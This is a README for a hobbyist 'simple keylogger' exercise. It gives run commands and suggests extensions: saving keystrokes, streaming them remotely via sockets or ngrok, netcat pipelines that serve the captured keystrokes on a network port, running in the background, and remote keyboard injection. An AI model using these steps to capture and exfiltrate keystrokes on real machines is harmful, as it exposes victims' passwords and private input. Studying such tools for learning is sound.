# simple keylogger

Keyloggers are simple to build with the 'keyboard' module!

## Running from fun_with_cybersec folder
* First, follow instructions [here](https://github.com/FrozenBurrito/fun_with_cybersec/blob/main/README.md) to setup virtual environment.
* Running on Linux
```
source .venv/bin/activate
python simple_keylogger.py
```
* Running on Windows
```
scripts\activate.bat
python simple_keylogger.py
```
<img src="kl_screenshot.png" width="75%" height="75%" />

## Extension Activities
* Modify simple_keylogger.py to:
  * Save the output to file.
    * See 'use as standalone module' in github repo linked below.
  * Stream output remotely or schedule data dumps 
    * Try using sockets or ngrok+flask
* Command line extension activities:
  * Stream output with netcat:
    * Server, Keylogger (ex: 10.2.0.5):
      * python3 kl.py | nc -lkv 7777.  
      * or, python -m keyboard | nc -lkv 7777
    * Client (ex: 10.2.0.6):  
      * nc -zv 10.2.0.5 7777
      * or, use firefox.
  * Run in background using '&' and pipe output to file.
* Remote keyboard injection (possible with keyboard module)

## Helpful Libraries and Links

* [keyboard module](https://github.com/boppreh/keyboard)
* [netcat man page](https://man7.org/linux/man-pages/man1/ncat.1.html)
* [ncat by nmap](https://nmap.org/ncat/guide/index.html
